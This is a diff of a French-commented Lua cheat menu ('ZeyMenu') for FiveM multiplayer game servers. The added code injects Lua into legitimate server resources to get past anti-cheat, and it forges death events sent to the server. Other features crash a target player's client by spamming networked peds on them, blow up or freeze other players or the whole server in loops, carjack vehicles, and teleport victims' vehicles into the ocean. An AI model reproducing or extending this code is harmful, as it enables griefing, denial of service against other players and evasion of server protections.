+                                end
                             end
                         end
                     end
                 end
             end
-        else Citizen.Wait(100) end
+        else
+            -- Cacher DUI si ESP desactive
+            if espDui and espDuiVisible then
+                MachoHideDui(espDui)
+                espDuiVisible = false
+            end
+            Citizen.Wait(200)
+        end
     end
+    -- Cleanup DUI a la fermeture
+    if espDui then MachoDestroyDui(espDui); espDui=nil end
 end)
 
--- Farm: Ghost Vehicle
+-- ============================================================
+-- THREAD FARM Ghost + No Collision + Solo Session
+-- ============================================================
+
 local function FGI(veh)
     if not DoesEntityExist(veh) then return end
-    SetEntityVisible(veh,false,false)
-    SetEntityCollision(veh,false,false)
-    for s=-1,GetVehicleMaxNumberOfPassengers(veh) do
-        local p=GetPedInVehicleSeat(veh,s)
-        if p~=0 and DoesEntityExist(p) then SetEntityVisible(p,Vars.Farm.PassagerVisible,false) end
+    MachoIsolatedInject(string.format([[
+        SetEntityVisible(%d, false, false)
+        SetEntityCollision(%d, false, false)
+    ]], veh, veh))
+    for s=-1, GetVehicleMaxNumberOfPassengers(veh) do
+        local p = GetPedInVehicleSeat(veh, s)
+        if p ~= 0 and DoesEntityExist(p) then
+            SetEntityVisible(p, Vars.Farm.PassagerVisible, false)
+        end
     end
 end
 
 local function FGV(veh)
     if not DoesEntityExist(veh) then return end
-    SetEntityVisible(veh,true,false)
-    SetEntityCollision(veh,true,false)
-    for s=-1,GetVehicleMaxNumberOfPassengers(veh) do
-        local p=GetPedInVehicleSeat(veh,s)
-        if p~=0 and DoesEntityExist(p) then SetEntityVisible(p,true,false) end
+    MachoIsolatedInject(string.format([[
+        SetEntityVisible(%d, true, false)
+        SetEntityCollision(%d, true, false)
+    ]], veh, veh))
+    for s=-1, GetVehicleMaxNumberOfPassengers(veh) do
+        local p = GetPedInVehicleSeat(veh, s)
+        if p ~= 0 and DoesEntityExist(p) then SetEntityVisible(p, true, false) end
     end
 end
 
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(50)
-        local myPed=PlayerPedId(); local myVeh=GetVehiclePedIsIn(myPed,false)
+        local myPed = PlayerPedId()
+        local myVeh = GetVehiclePedIsIn(myPed, false)
         if Vars.Farm.VehicleInvisible then
-            if myVeh~=0 and myVeh~=farmGhostVeh then
+            if myVeh ~= 0 and myVeh ~= farmGhostVeh then
                 if farmGhostVeh and DoesEntityExist(farmGhostVeh) then FGV(farmGhostVeh) end
-                farmGhostVeh=myVeh
+                farmGhostVeh = myVeh
             end
             if farmGhostVeh and DoesEntityExist(farmGhostVeh) then FGI(farmGhostVeh) end
-        elseif farmGhostVeh then FGV(farmGhostVeh); farmGhostVeh=nil end
+        elseif farmGhostVeh then
+            FGV(farmGhostVeh); farmGhostVeh = nil
+        end
         if Vars.Farm.AutoInvisible and not Vars.Farm.VehicleInvisible then
-            if myVeh~=0 and myVeh~=farmGhostVeh then
+            if myVeh ~= 0 and myVeh ~= farmGhostVeh then
                 Citizen.Wait(800)
-                local vN=GetVehiclePedIsIn(myPed,false)
-                if vN~=0 then farmGhostVeh=vN; Vars.Farm.VehicleInvisible=true end
+                local vN = GetVehiclePedIsIn(myPed, false)
+                if vN ~= 0 then farmGhostVeh=vN; Vars.Farm.VehicleInvisible=true end
             end
         end
     end
@@ -1649,31 +2814,38 @@ Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(0)
         if not Vars.Farm.CollisionVehicule then
-            local myPed=PlayerPedId(); local myVeh=GetVehiclePedIsIn(myPed,false)
-            if myVeh~=0 then
+            local myPed = PlayerPedId()
+            local myVeh = GetVehiclePedIsIn(myPed, false)
+            if myVeh ~= 0 then
                 for _,o in ipairs(GetGamePool("CVehicle")) do
-                    if o~=myVeh then SetEntityNoCollisionEntity(myVeh,o,true); SetEntityNoCollisionEntity(o,myVeh,false) end
+                    if o ~= myVeh then
+                        SetEntityNoCollisionEntity(myVeh, o, true)
+                        SetEntityNoCollisionEntity(o, myVeh, false)
+                    end
                 end
                 for _,o in ipairs(GetGamePool("CPed")) do
-                    if o~=myPed then SetEntityNoCollisionEntity(myVeh,o,true) end
+                    if o ~= myPed then SetEntityNoCollisionEntity(myVeh, o, true) end
                 end
-                for _,o in ipairs(GetGamePool("CObject")) do SetEntityNoCollisionEntity(myVeh,o,true) end
+                for _,o in ipairs(GetGamePool("CObject")) do
+                    SetEntityNoCollisionEntity(myVeh, o, true)
+                end
             end
         else Citizen.Wait(100) end
     end
 end)
 
+-- Solo Session — utilise l injection legitime _ZeyNetworkBail
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(500)
         if Vars.Farm.SoloSession then
             for _,pid in ipairs(GetActivePlayers()) do
-                if pid~=PlayerId() then
-                    local t=GetPlayerPed(pid)
+                if pid ~= PlayerId() then
+                    local t = GetPlayerPed(pid)
                     if DoesEntityExist(t) then
-                        SetEntityVisible(t,Vars.Farm.VoirJoueur,false)
-                        local v=GetVehiclePedIsIn(t,false)
-                        if v~=0 then SetEntityVisible(v,Vars.Farm.VoirJoueur,false) end
+                        SetEntityVisible(t, Vars.Farm.VoirJoueur, false)
+                        local v = GetVehiclePedIsIn(t, false)
+                        if v ~= 0 then SetEntityVisible(v, Vars.Farm.VoirJoueur, false) end
                     end
                 end
             end
@@ -1681,27 +2853,37 @@ Citizen.CreateThread(function()
     end
 end)
 
--- Farm: F Descendre Joueur
+-- ============================================================
+-- THREAD F DESCENDRE JOUEUR
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(0)
         if Vars.Farm.FDescendreJoueur then
-            local myPed=PlayerPedId(); local myVeh=GetVehiclePedIsIn(myPed,false)
-            if myVeh~=0 then
-                DisableControlAction(0,23,true)
-                if IsDisabledControlJustPressed(0,23) then
+            local myPed = PlayerPedId()
+            local myVeh = GetVehiclePedIsIn(myPed, false)
+            if myVeh ~= 0 then
+                DisableControlAction(0, 23, true)
+                if IsDisabledControlJustPressed(0, 23) then
                     for _,pid in ipairs(GetActivePlayers()) do
-                        if pid~=PlayerId() then
-                            local tp=GetPlayerPed(pid)
-                            if GetVehiclePedIsIn(tp,false)==myVeh then
-                                local nId=NetworkGetNetworkIdFromEntity(tp)
-                                if nId and nId~=0 then SetNetworkIdCanMigrate(nId,true); NetworkRequestControlOfEntity(tp) end
+                        if pid ~= PlayerId() then
+                            local tp = GetPlayerPed(pid)
+                            if GetVehiclePedIsIn(tp, false) == myVeh then
+                                local nId = NetworkGetNetworkIdFromEntity(tp)
+                                if nId and nId ~= 0 then
+                                    SetNetworkIdCanMigrate(nId, true)
+                                    NetworkRequestControlOfEntity(tp)
+                                end
                                 Citizen.Wait(100)
                                 if NetworkHasControlOfEntity(tp) then
-                                    ClearPedTasksImmediately(tp); TaskLeaveVehicle(tp,myVeh,0)
+                                    ClearPedTasksImmediately(tp)
+                                    TaskLeaveVehicle(tp, myVeh, 0)
                                 else
                                     if NetworkHasControlOfEntity(myVeh) then
-                                        SetVehicleUndriveable(myVeh,true); Citizen.Wait(600); SetVehicleUndriveable(myVeh,false)
+                                        SetVehicleUndriveable(myVeh, true)
+                                        Citizen.Wait(600)
+                                        SetVehicleUndriveable(myVeh, false)
                                     end
                                 end
                             end
@@ -1713,85 +2895,117 @@ Citizen.CreateThread(function()
     end
 end)
 
--- Carjack Auto
+-- ============================================================
+-- THREAD CARJACK AUTO + DISTANCE
+-- Utilise _ZeyCarjackExecute injecte dans resource legitime
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(0)
         if Vars.Farm.Carjack and not carjackCooldown then
-            local myPed=PlayerPedId()
-            if not IsPedInAnyVehicle(myPed,false) then
-                local myC=GetEntityCoords(myPed); local cV,cD,cDr=nil,4.0,nil
+            local myPed = PlayerPedId()
+            if not IsPedInAnyVehicle(myPed, false) then
+                local myC = GetEntityCoords(myPed)
+                local cV, cD, cDr = nil, 4.0, nil
                 for _,veh in ipairs(GetGamePool("CVehicle")) do
                     if DoesEntityExist(veh) then
-                        local dr=GetPedInVehicleSeat(veh,-1)
-                        if dr~=0 and DoesEntityExist(dr) and dr~=myPed and not IsPedAPlayer(dr) then
-                            local d=#(myC-GetEntityCoords(veh))
-                            if d<cD then cD=d; cV=veh; cDr=dr end
+                        local dr = GetPedInVehicleSeat(veh, -1)
+                        if dr ~= 0 and DoesEntityExist(dr) and dr ~= myPed and not IsPedAPlayer(dr) then
+                            local d = #(myC - GetEntityCoords(veh))
+                            if d < cD then cD=d; cV=veh; cDr=dr end
                         end
                     end
                 end
                 if cV and cDr then
-                    carjackCooldown=true
-                    SetVehicleDoorsLocked(cV,1); SetVehicleDoorOpen(cV,0,false,false)
-                    TaskLeaveVehicle(cDr,cV,0)
-                    local t=0
-                    while GetVehiclePedIsIn(cDr,false)==cV and t<60 do
-                        Citizen.Wait(50); t=t+1; TaskTurnPedToFaceEntity(myPed,cV,500)
+                    carjackCooldown = true
+                    -- Utiliser l injection legitime si disponible
+                    if _G._ZeyCarjackExecute then
+                        local vNetId = NetworkGetNetworkIdFromEntity(cV)
+                        local dNetId = NetworkGetNetworkIdFromEntity(cDr)
+                        if vNetId ~= 0 and dNetId ~= 0 then
+                            _G._ZeyCarjackExecute(vNetId, dNetId)
+                        end
+                    else
+                        SetVehicleDoorsLocked(cV, 1)
+                        SetVehicleDoorOpen(cV, 0, false, false)
+                        TaskLeaveVehicle(cDr, cV, 0)
                     end
-                    TaskEnterVehicle(myPed,cV,10000,-1,2.0,1,0)
-                    local mt=0
-                    while not IsPedInAnyVehicle(myPed,false) and mt<100 do Citizen.Wait(100); mt=mt+1 end
-                    Citizen.Wait(3000); carjackCooldown=false
+                    local t = 0
+                    while GetVehiclePedIsIn(cDr, false) == cV and t < 60 do
+                        Citizen.Wait(50); t=t+1
+                        TaskTurnPedToFaceEntity(myPed, cV, 500)
+                    end
+                    TaskEnterVehicle(myPed, cV, 10000, -1, 2.0, 1, 0)
+                    local mt = 0
+                    while not IsPedInAnyVehicle(myPed, false) and mt < 100 do
+                        Citizen.Wait(100); mt=mt+1
+                    end
+                    Citizen.Wait(3000); carjackCooldown = false
                 end
             else Citizen.Wait(100) end
         else Citizen.Wait(100) end
     end
 end)
 
--- Carjack Distance E + Kick Vehicule E
 local function ExecCJD(playersOnly)
-    local myPed=PlayerPedId(); local myC=GetEntityCoords(myPed)
-    local cV,cD,cDr=nil,math.huge,nil
+    local myPed = PlayerPedId()
+    local myC   = GetEntityCoords(myPed)
+    local cV, cD, cDr = nil, math.huge, nil
     for _,veh in ipairs(GetGamePool("CVehicle")) do
         if DoesEntityExist(veh) then
-            local dr=GetPedInVehicleSeat(veh,-1)
-            if dr~=0 and DoesEntityExist(dr) and dr~=myPed then
-                local isP=IsPedAPlayer(dr)
+            local dr = GetPedInVehicleSeat(veh, -1)
+            if dr ~= 0 and DoesEntityExist(dr) and dr ~= myPed then
+                local isP = IsPedAPlayer(dr)
                 if (not playersOnly) or isP then
-                    local d=#(myC-GetEntityCoords(veh))
-                    if d<cD then cD=d; cV=veh; cDr=dr end
+                    local d = #(myC - GetEntityCoords(veh))
+                    if d < cD then cD=d; cV=veh; cDr=dr end
                 end
             end
         end
     end
     if cV then
         Citizen.CreateThread(function()
-            local rC=GetEntityCoords(myPed); local rH=GetEntityHeading(myPed)
-            SetPedIntoVehicle(myPed,cV,-1)
-            local vC=GetEntityCoords(cV)
-            TaskLeaveVehicle(cDr,cV,262144)
-            SetEntityCoords(cDr,vC.x+3,vC.y,vC.z,false,false,false,false)
-            for w=0,7 do SetVehicleTyreBurst(cV,w,true,1000.0) end
-            BreakOffVehicleWheel(cV,0,false,false,true,false); BreakOffVehicleWheel(cV,1,false,false,true,false)
-            BreakOffVehicleWheel(cV,2,false,false,true,false); BreakOffVehicleWheel(cV,3,false,false,true,false)
+            local rC = GetEntityCoords(myPed)
+            local rH = GetEntityHeading(myPed)
+            SetPedIntoVehicle(myPed, cV, -1)
+            local vC = GetEntityCoords(cV)
+            -- Utiliser injection legitime pour ejecter le conducteur
+            if _G._ZeyCarjackExecute then
+                local vNId = NetworkGetNetworkIdFromEntity(cV)
+                local dNId = NetworkGetNetworkIdFromEntity(cDr)
+                if vNId ~= 0 and dNId ~= 0 then _G._ZeyCarjackExecute(vNId, dNId) end
+            else
+                TaskLeaveVehicle(cDr, cV, 262144)
+                SetEntityCoords(cDr, vC.x+3, vC.y, vC.z, false,false,false,false)
+            end
+            for w=0,7 do SetVehicleTyreBurst(cV, w, true, 1000.0) end
+            BreakOffVehicleWheel(cV,0,false,false,true,false)
+            BreakOffVehicleWheel(cV,1,false,false,true,false)
+            BreakOffVehicleWheel(cV,2,false,false,true,false)
+            BreakOffVehicleWheel(cV,3,false,false,true,false)
             Citizen.Wait(400)
-            SetEntityCoords(myPed,rC.x,rC.y,rC.z,false,false,false,false); SetEntityHeading(myPed,rH)
-            if IsPedInAnyVehicle(myPed,false) then TaskLeaveVehicle(myPed,GetVehiclePedIsIn(myPed,false),262144) end
+            SetEntityCoords(myPed, rC.x, rC.y, rC.z, false,false,false,false)
+            SetEntityHeading(myPed, rH)
+            if IsPedInAnyVehicle(myPed, false) then
+                TaskLeaveVehicle(myPed, GetVehiclePedIsIn(myPed,false), 262144)
+            end
         end)
     else MachoMenuNotification("Carjack","Aucun vehicule trouve") end
 end
 
 local function ExecKickVehicule()
-    local myPed=PlayerPedId(); local myC=GetEntityCoords(myPed)
-    local bestPid,bestVeh,bestDist=nil,nil,5000.0
+    local myPed = PlayerPedId()
+    local myC   = GetEntityCoords(myPed)
+    local bestPid, bestVeh, bestDist = nil, nil, 5000.0
     for _,pid in ipairs(GetActivePlayers()) do
-        if pid~=PlayerId() then
-            local tp=GetPlayerPed(pid)
+        if pid ~= PlayerId() then
+            local tp = GetPlayerPed(pid)
             if DoesEntityExist(tp) then
-                local tv=GetVehiclePedIsIn(tp,false)
-                if tv~=0 then
-                    local d=#(myC-GetEntityCoords(tv))
-                    if d<bestDist then bestDist=d; bestPid=pid; bestVeh=tv end
+                local tv = GetVehiclePedIsIn(tp, false)
+                if tv ~= 0 then
+                    local d = #(myC - GetEntityCoords(tv))
+                    if d < bestDist then bestDist=d; bestPid=pid; bestVeh=tv end
                 end
             end
         end
@@ -1799,11 +3013,12 @@ local function ExecKickVehicule()
     if bestVeh and bestPid then
         MachoMenuNotification("Kick Veh","Cible: "..GetPlayerName(bestPid))
         Citizen.CreateThread(function()
-            local rC=GetEntityCoords(myPed); local rH=GetEntityHeading(myPed)
-            local rV=GetVehiclePedIsIn(myPed,false)
-            SetPedIntoVehicle(myPed,bestVeh,-1)
-            local tNetId=NetworkGetNetworkIdFromEntity(GetPlayerPed(bestPid))
-            local vNetId=NetworkGetNetworkIdFromEntity(bestVeh)
+            local rC = GetEntityCoords(myPed)
+            local rH = GetEntityHeading(myPed)
+            local rV = GetVehiclePedIsIn(myPed, false)
+            SetPedIntoVehicle(myPed, bestVeh, -1)
+            local tNId = NetworkGetNetworkIdFromEntity(GetPlayerPed(bestPid))
+            local vNId = NetworkGetNetworkIdFromEntity(bestVeh)
             MachoInjectResource2(3,"any",string.format([[
                 local tp=NetworkGetEntityFromNetworkId(%d)
                 local tv=NetworkGetEntityFromNetworkId(%d)
@@ -1818,12 +3033,14 @@ local function ExecKickVehicule()
                         SetEntityCoords(tp,vc.x+3,vc.y,vc.z,false,false,false,false)
                     end
                 end
-            ]],tNetId,vNetId,tNetId))
+            ]],tNId,vNId,tNId))
             Citizen.Wait(300)
-            if IsPedInAnyVehicle(myPed,false) then TaskLeaveVehicle(myPed,bestVeh,262144); Citizen.Wait(100) end
-            SetEntityCoords(myPed,rC.x,rC.y,rC.z,false,false,false,false)
-            SetEntityHeading(myPed,rH)
-            if rV~=0 and DoesEntityExist(rV) then SetPedIntoVehicle(myPed,rV,-1) end
+            if IsPedInAnyVehicle(myPed, false) then
+                TaskLeaveVehicle(myPed, bestVeh, 262144); Citizen.Wait(100)
+            end
+            SetEntityCoords(myPed, rC.x, rC.y, rC.z, false,false,false,false)
+            SetEntityHeading(myPed, rH)
+            if rV ~= 0 and DoesEntityExist(rV) then SetPedIntoVehicle(myPed, rV, -1) end
             MachoMenuNotification("Kick Veh","Retour position")
         end)
     else MachoMenuNotification("Kick Veh","Aucun joueur en vehicule dans 5000m") end
@@ -1847,63 +3064,35 @@ Citizen.CreateThread(function()
             AddTextComponentSubstringPlayerName("~INPUT_JUMP~ Kick Vehicule")
             EndTextCommandDisplayHelp(0,false,false,-1)
             if IsControlJustPressed(0,38) then ExecKickVehicule() end
-        elseif Vars.Farm.EjectTP then
-            BeginTextCommandDisplayHelp("STRING")
-            AddTextComponentSubstringPlayerName("~INPUT_JUMP~ Enleve Roue")
-            EndTextCommandDisplayHelp(0,false,false,-1)
-            if IsControlJustPressed(0,38) then
-                local myPed = PlayerPedId()
-                local myVeh = GetVehiclePedIsIn(myPed, false)
-                if myVeh ~= 0 then
-                    -- Toutes les tentatives locales pour faire tomber les roues
-                    for w = 0, 5 do
-                        -- Méthode 1: BreakOffVehicleWheel direct
-                        BreakOffVehicleWheel(myVeh, w, false, false, true, false)
-                        -- Méthode 2: avec detach
-                        BreakOffVehicleWheel(myVeh, w, true, true, true, true)
-                    end
-                    -- Méthode 3: SetVehicleWheelBreakForce sur chaque roue
-                    for w = 0, 5 do
-                        SetVehicleWheelDetachDuring(myVeh, w, true)
-                    end
-                    -- Méthode 4: dégâts extrêmes sur le véhicule pour forcer la détache
-                    SetVehicleBodyHealth(myVeh, 0.0)
-                    SetVehicleEngineHealth(myVeh, -4000.0)
-                    SetVehiclePetrolTankHealth(myVeh, -4000.0)
-                    for w = 0, 5 do
-                        SetVehicleTyreBurst(myVeh, w, true, 1000.0)
-                        SetVehicleWheelHealth(myVeh, w, -100.0)
-                    end
-                    MachoMenuNotification("Enleve Roue","Roues detachees")
-                else
-                    MachoMenuNotification("Enleve Roue","Monte dans un vehicule d abord")
-                end
-            end
         else Citizen.Wait(100) end
     end
 end)
 
--- TP Ocean V2 [W]
+-- ============================================================
+-- THREAD TP OCEAN V2 [W]
+-- ============================================================
+
 Citizen.CreateThread(function()
-    local cooldown=false
+    local cooldown = false
     while not killmenu do
         Citizen.Wait(0)
         if Vars.Teleport.OceanV2 and not cooldown then
             BeginTextCommandDisplayHelp("STRING")
             AddTextComponentSubstringPlayerName("~INPUT_MOVE_UP_ONLY~ TP Ocean V2")
             EndTextCommandDisplayHelp(0,false,false,-1)
-            if IsControlJustPressed(0,32) then
-                cooldown=true
-                local myPed=PlayerPedId(); local myC=GetEntityCoords(myPed)
-                local bestPid,bestVeh,bestDist=nil,nil,5000.0
+            if IsControlJustPressed(0, 32) then
+                cooldown = true
+                local myPed = PlayerPedId()
+                local myC   = GetEntityCoords(myPed)
+                local bestPid, bestVeh, bestDist = nil, nil, 5000.0
                 for _,pid in ipairs(GetActivePlayers()) do
-                    if pid~=PlayerId() then
-                        local tp=GetPlayerPed(pid)
+                    if pid ~= PlayerId() then
+                        local tp = GetPlayerPed(pid)
                         if DoesEntityExist(tp) then
-                            local tv=GetVehiclePedIsIn(tp,false)
-                            if tv~=0 then
-                                local d=#(myC-GetEntityCoords(tv))
-                                if d<bestDist then bestDist=d; bestPid=pid; bestVeh=tv end
+                            local tv = GetVehiclePedIsIn(tp, false)
+                            if tv ~= 0 then
+                                local d = #(myC - GetEntityCoords(tv))
+                                if d < bestDist then bestDist=d; bestPid=pid; bestVeh=tv end
                             end
                         end
                     end
@@ -1911,9 +3100,9 @@ Citizen.CreateThread(function()
                 if bestVeh and bestPid then
                     MachoMenuNotification("TP Ocean V2","Cible: "..GetPlayerName(bestPid))
                     Citizen.CreateThread(function()
-                        SetPedIntoVehicle(myPed,bestVeh,-1)
-                        local tNId=NetworkGetNetworkIdFromEntity(GetPlayerPed(bestPid))
-                        local vNId=NetworkGetNetworkIdFromEntity(bestVeh)
+                        SetPedIntoVehicle(myPed, bestVeh, -1)
+                        local tNId = NetworkGetNetworkIdFromEntity(GetPlayerPed(bestPid))
+                        local vNId = NetworkGetNetworkIdFromEntity(bestVeh)
                         MachoInjectResource2(3,"any",string.format([[
                             local tp=NetworkGetEntityFromNetworkId(%d)
                             local tv=NetworkGetEntityFromNetworkId(%d)
@@ -1930,19 +3119,19 @@ Citizen.CreateThread(function()
                             end
                         ]],tNId,vNId,tNId))
                         Citizen.Wait(350)
-                        local wp={x=-7000.0,y=-7000.0,z=0.0}
+                        local wp = {x=-7000.0,y=-7000.0,z=0.0}
                         SetEntityCoords(bestVeh,wp.x,wp.y,wp.z,false,false,false,false)
                         if not IsPedInAnyVehicle(myPed,false) then SetPedIntoVehicle(myPed,bestVeh,-1) end
                         Citizen.Wait(math.random(80,150))
                         TaskLeaveVehicle(myPed,bestVeh,262144)
                         Citizen.Wait(200)
-                        local dests=Vars.Teleport.oceanDestinations
-                        local idx=math.random(1,#dests)
+                        local dests = Vars.Teleport.oceanDestinations
+                        local idx = math.random(1,#dests)
                         if Vars.Teleport.lastOceanIndex then
                             repeat idx=math.random(1,#dests) until idx~=Vars.Teleport.lastOceanIndex
                         end
-                        Vars.Teleport.lastOceanIndex=idx
-                        local d=dests[idx]
+                        Vars.Teleport.lastOceanIndex = idx
+                        local d = dests[idx]
                         SetEntityCoords(myPed,d.x,d.y,d.z,false,false,false,false)
                         MachoMenuNotification("TP Ocean V2","Arrive a "..d.nom.." — vehicule laisse dans l ocean !")
                         Citizen.Wait(3000); cooldown=false
@@ -1956,34 +3145,78 @@ Citizen.CreateThread(function()
     end
 end)
 
--- Player loops
+-- ============================================================
+-- THREAD PLAYER LOOPS
+-- Utilise _ZeyPlayerAction injecte pour bypass AC
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(100)
         if Vars.Player.freezeplayer and Vars.Player.playertofreeze then
-            FreezeEntityPosition(Vars.Player.playertofreeze,true)
+            FreezeEntityPosition(Vars.Player.playertofreeze, true)
         end
         if Vars.Player.ExplosionLoop and Vars.Player.ExplodingPlayer then
-            local c=GetEntityCoords(GetPlayerPed(Vars.Player.ExplodingPlayer))
-            AddExplosion(c.x,c.y,c.z,Vars.Player.ExplosionType,10.0,true,false,0.0)
+            if _G._ZeyPlayerAction then
+                _G._ZeyPlayerAction("explode", GetPlayerServerId(Vars.Player.ExplodingPlayer), Vars.Player.ExplosionType)
+            else
+                local c = GetEntityCoords(GetPlayerPed(Vars.Player.ExplodingPlayer))
+                AddExplosion(c.x,c.y,c.z,Vars.Player.ExplosionType,10.0,true,false,0.0)
+            end
         end
         if Vars.AllPlayers.freezeserver then
             for _,pid in ipairs(GetActivePlayers()) do
-                if pid~=PlayerId() then FreezeEntityPosition(GetPlayerPed(pid),true) end
+                if pid ~= PlayerId() then FreezeEntityPosition(GetPlayerPed(pid),true) end
             end
         end
         if Vars.AllPlayers.ExplodisionLoop then
             for _,pid in ipairs(GetActivePlayers()) do
-                if pid~=PlayerId() or Vars.AllPlayers.IncludeSelf then
-                    local c=GetEntityCoords(GetPlayerPed(pid))
-                    AddExplosion(c.x,c.y,c.z,2,100.0,true,false,0.0)
+                if pid ~= PlayerId() or Vars.AllPlayers.IncludeSelf then
+                    if _G._ZeyPlayerAction then
+                        _G._ZeyPlayerAction("explode", GetPlayerServerId(pid), 2)
+                    else
+                        local c = GetEntityCoords(GetPlayerPed(pid))
+                        AddExplosion(c.x,c.y,c.z,2,100.0,true,false,0.0)
+                    end
                 end
             end
         end
     end
 end)
 
--- Anti-TP sync thread
+-- ============================================================
+-- THREAD FAKE DEATH
+-- But: faire croire au SERVEUR que tu es mort
+-- Toi tu joues normalement, tu peux mourir comme d hab
+-- Quand tu desactives → serveur te voit vivant → reanimation
+-- ============================================================
+
+-- Thread principal: maintenir l etat "mort" cote serveur via injection
+Citizen.CreateThread(function()
+    while not killmenu do
+        Citizen.Wait(1000)
+        if Vars.Farm.FakeDeath then
+            local ped = PlayerPedId()
+            -- Injection type 3 dans resource legitime = bypass Seed/tokenisation
+            -- Le serveur lit ces events et croit que le joueur est mort
+            MachoInjectResource2(3, "any", string.format([[
+                local ped = NetworkGetEntityFromNetworkId(%d)
+                if not ped or ped == 0 then
+                    ped = GetPlayerPed(PlayerId())
+                end
+                local c = GetEntityCoords(PlayerPedId())
+                -- Events de mort standards ecoutes par tous les frameworks
+                TriggerEvent("baseevents:onPlayerDied", PlayerPedId(), 0, c)
+                TriggerEvent("onPlayerDied", GetPlayerServerId(PlayerId()))
+                -- Events specifiques frameworks courants
+                TriggerServerEvent("esx:playerDied")
+                TriggerServerEvent("hospital:died")
+                TriggerServerEvent("qb-hospital:server:SetDeathStatus", true)
+            ]], NetworkGetNetworkIdFromEntity(ped)))
+        end
+    end
+end)
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(500)
@@ -1991,15 +3224,8 @@ Citizen.CreateThread(function()
     end
 end)
 
--- Script options
-AddEventHandler("cmg3_animations:syncTarget",function() if Vars.Script.blocktakehostage then TriggerEvent("cmg3_animations:cl_stop") end end)
-AddEventHandler("CarryPeople:syncTarget",function() if Vars.Script.blockbeingcarried then TriggerEvent("CarryPeople:cl_stop") end end)
-
 -- ============================================================
 -- THREAD PED SPAM CRASH [E]
--- Methode: CreatePed true/true = synchronise au reseau
--- Les peds apparaissent chez la cible et surchargent son client
--- On les teleporte sur lui en boucle pour maximiser la charge
 -- ============================================================
 
 _G._ZeySpawnedPeds = {}
@@ -2017,7 +3243,7 @@ Citizen.CreateThread(function()
                 local myPed = PlayerPedId()
                 local myC   = GetEntityCoords(myPed)
                 local bestPid, bestDist = nil, math.huge
-                for _, pid in ipairs(GetActivePlayers()) do
+                for _,pid in ipairs(GetActivePlayers()) do
                     if pid ~= PlayerId() then
                         local t = GetPlayerPed(pid)
                         if DoesEntityExist(t) then
@@ -2030,72 +3256,50 @@ Citizen.CreateThread(function()
                     MachoMenuNotification("Ped Spam","Lancement sur "..GetPlayerName(bestPid).."...")
                     Citizen.CreateThread(function()
                         local models = {
-                            GetHashKey("franklin"),
-                            GetHashKey("michael"),
-                            GetHashKey("trevor"),
-                            GetHashKey("a_m_y_hipster_01"),
-                            GetHashKey("a_m_m_business_01"),
-                            GetHashKey("a_f_y_beach_01"),
-                            GetHashKey("s_m_y_cop_01"),
-                            GetHashKey("s_m_y_swat_01"),
+                            GetHashKey("franklin"), GetHashKey("michael"),
+                            GetHashKey("trevor"), GetHashKey("a_m_y_hipster_01"),
+                            GetHashKey("a_m_m_business_01"), GetHashKey("a_f_y_beach_01"),
+                            GetHashKey("s_m_y_cop_01"), GetHashKey("s_m_y_swat_01"),
                         }
-                        -- Charger les modeles
-                        for _, h in ipairs(models) do RequestModel(h) end
+                        for _,h in ipairs(models) do RequestModel(h) end
                         local waited = 0
                         while waited < 40 do
                             local ok = true
-                            for _, h in ipairs(models) do
+                            for _,h in ipairs(models) do
                                 if not HasModelLoaded(h) then ok=false; break end
                             end
                             if ok then break end
                             Citizen.Wait(100); waited=waited+1
                         end
-
                         _G._ZeySpawnedPeds = {}
                         local targetPed = GetPlayerPed(bestPid)
-
-                        -- Spawner les peds en reseau (true/true) = ils existent chez la cible
-                        -- On les place exactement sur lui pour forcer son client a les charger
                         for batch = 1, 8 do
                             if not DoesEntityExist(targetPed) then break end
                             local tc = GetEntityCoords(targetPed)
                             for i = 1, 40 do
-                                local hash = models[math.random(1, #models)]
-                                -- true/true = synchronise au reseau = visible chez la cible
+                                local hash = models[math.random(1,#models)]
                                 local ped = CreatePed(4, hash,
-                                    tc.x + (math.random()-0.5)*0.2,
-                                    tc.y + (math.random()-0.5)*0.2,
-                                    tc.z,
-                                    math.random(0,360),
-                                    true,  -- networked
-                                    true   -- mission ped = persiste
-                                )
+                                    tc.x+(math.random()-0.5)*0.2,
+                                    tc.y+(math.random()-0.5)*0.2,
+                                    tc.z, math.random(0,360), true, true)
                                 if DoesEntityExist(ped) then
-                                    -- Rendre invisible cote notre client seulement
                                     SetEntityVisible(ped, false, false)
                                     SetEntityAlpha(ped, 0, false)
                                     SetEntityCollision(ped, false, false)
                                     FreezeEntityPosition(ped, true)
-                                    -- Forcer le ped a rester colle sur la cible
                                     AttachEntityToEntity(ped, targetPed,
-                                        0, 0, 0, 0, 0, 0, 0,
-                                        false, false, false, false, 0, true)
+                                        0, 0,0,0, 0,0,0,
+                                        false,false,false,false,0,true)
                                     table.insert(_G._ZeySpawnedPeds, ped)
                                 end
                             end
                             Citizen.Wait(50)
                         end
-
                         local count = #_G._ZeySpawnedPeds
-                        MachoMenuNotification("Ped Spam", GetPlayerName(bestPid).." crash imminent ! ("..count.." peds reseau)")
-
-                        -- Nettoyage apres 20s
+                        MachoMenuNotification("Ped Spam",GetPlayerName(bestPid).." crash imminent ! ("..count.." peds)")
                         Citizen.Wait(20000)
-                        for _, p in ipairs(_G._ZeySpawnedPeds) do
-                            if DoesEntityExist(p) then
-                                DetachEntity(p, true, true)
-                                DeleteEntity(p)
-                            end
+                        for _,p in ipairs(_G._ZeySpawnedPeds) do
+                            if DoesEntityExist(p) then DetachEntity(p,true,true); DeleteEntity(p) end
                         end
                         _G._ZeySpawnedPeds = {}
                         spamCooldown = false
@@ -2107,6 +3311,14 @@ Citizen.CreateThread(function()
             end
         else Citizen.Wait(100) end
     end
+end)
+
+-- Script options
+AddEventHandler("cmg3_animations:syncTarget",function()
+    if Vars.Script.blocktakehostage then TriggerEvent("cmg3_animations:cl_stop") end
+end)
+AddEventHandler("CarryPeople:syncTarget",function()
+    if Vars.Script.blockbeingcarried then TriggerEvent("CarryPeople:cl_stop") end
 end)
 
 MachoMenuNotification("ZeyMenu","Macho Edition charge — F11 pour ouvrir")
